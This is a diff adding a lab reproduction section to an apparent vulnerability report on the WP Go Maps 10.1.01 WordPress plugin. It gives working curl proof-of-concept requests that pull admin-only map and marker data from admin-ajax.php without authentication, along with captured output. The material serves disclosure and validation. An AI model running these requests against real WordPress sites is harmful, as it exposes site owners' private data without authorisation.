@@ -355,9 +355,77 @@ $html = preg_replace('/{COMPANY_NAME}/i', $company_name, $html);
 
 ---
 
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/wp-wp-google-maps/` (compose stack launched on `http://127.0.0.1:8094/`).
+
+**Pinned version:** WP Go Maps 10.1.01 (free version).
+
+**Stack actually used by lab:**
+- `wordpress:6-php8.2-apache` (WordPress 6.9.4, PHP 8.2.31, Apache/2.4.67)
+- `wordpress:cli-2.10-php8.2`
+- `mariadb:11`
+
+### Steps (executed in `poc.sh`)
+
+1. **Bring up the WP stack** with `docker compose up -d` and wait for WordPress to answer HTTP 200.
+2. **Seed a map + marker via wp-cli** so there is data to leak.
+3. **Unauth PoC: AdminMapDataTable** -- POST to `/wp-admin/admin-ajax.php` with `action=wpgmza_rest_api_request&route=/datatables&phpClass=WPGMZA\\AdminMapDataTable` (no cookies, no nonce). Returns full map configuration including titles, dimensions, edit buttons, and shortcodes.
+4. **Unauth PoC: AdminMarkerDataTable** -- POST with `phpClass=WPGMZA\\AdminMarkerDataTable&map_id=1`. Returns all markers with addresses, coordinates, descriptions, images, and admin action buttons (edit/delete with marker IDs).
+5. **Control: non-WPGMZA class blocked** -- POST with `phpClass=WP_User` returns `{"errors":{"wpgmza_invalid_datatable_class":["Invalid class specified"]}}` confirming namespace check works but does not restrict admin-only classes within WPGMZA namespace.
+
+### PoC commands
+
+```bash
+# 1. Extract admin map data (no auth)
+curl -s -X POST "http://127.0.0.1:8094/wp-admin/admin-ajax.php" \
+  -d "action=wpgmza_rest_api_request&route=/datatables&phpClass=WPGMZA\\AdminMapDataTable"
+# -> {"recordsTotal":1,"recordsFiltered":1,"data":[["1","My first map","100%","600px","Roadmap",...]]}
+
+# 2. Extract admin marker data (no auth)
+curl -s -X POST "http://127.0.0.1:8094/wp-admin/admin-ajax.php" \
+  -d "action=wpgmza_rest_api_request&route=/datatables&phpClass=WPGMZA\\AdminMarkerDataTable&map_id=1"
+# -> {"recordsTotal":1,"recordsFiltered":1,"data":[...,"California",...,"data-delete-marker-id='1'",...]}
+
+# 3. Control: non-WPGMZA class blocked
+curl -s -X POST "http://127.0.0.1:8094/wp-admin/admin-ajax.php" \
+  -d "action=wpgmza_rest_api_request&route=/datatables&phpClass=WP_User"
+# -> {"errors":{"wpgmza_invalid_datatable_class":["Invalid class specified"]},...}
+```
+
+### Observed output (excerpt from `targets/labs/wp-wp-google-maps/results.txt`)
+
+```
+===== Step 4: Unauth PoC - AdminMapDataTable =====
+[+] response:
+    {"recordsTotal":1,"recordsFiltered":1,"data":[["1","My first map","100%","600px","Roadmap",...]],...}
+    ---HTTP 200---
+
+===== Step 5: Unauth PoC - AdminMarkerDataTable =====
+[+] response:
+    {"recordsTotal":1,"recordsFiltered":1,"data":[["<input type=\"checkbox\".../>","1",...,"California",...,"data-delete-marker-id='1'",...]],...}
+    ---HTTP 200---
+
+===== Step 6: Control - non-WPGMZA class should be blocked =====
+[+] response:
+    {"errors":{"wpgmza_invalid_datatable_class":["Invalid class specified"]},...}
+    ---HTTP 200---
+
+===== Verdict =====
+*** UNAUTH DATA EXPOSURE CONFIRMED ***
+Anonymous request to /datatables leaked admin-only data.
+Verdict: CONFIRMED
+```
+
+### Verdict
+
+**CONFIRMED.** Unauthenticated POST to `/wp-admin/admin-ajax.php` with `action=wpgmza_rest_api_request` and any WPGMZA-namespaced DataTable class in `phpClass` returns admin-only map/marker/overlay data. No cookies, nonces, or authentication of any kind required. Non-WPGMZA classes correctly rejected by namespace check, confirming the issue is specifically missing authorization on admin-only DataTable classes within the allowed namespace.
+
+---
+
 ## Test Environment
 
-- WordPress 6.x
+- WordPress 6.9.4
 - WP Go Maps 10.1.01 (free version)
-- PHP 8.2
+- PHP 8.2.31
 - Tested with all other plugins deactivated to isolate behavior
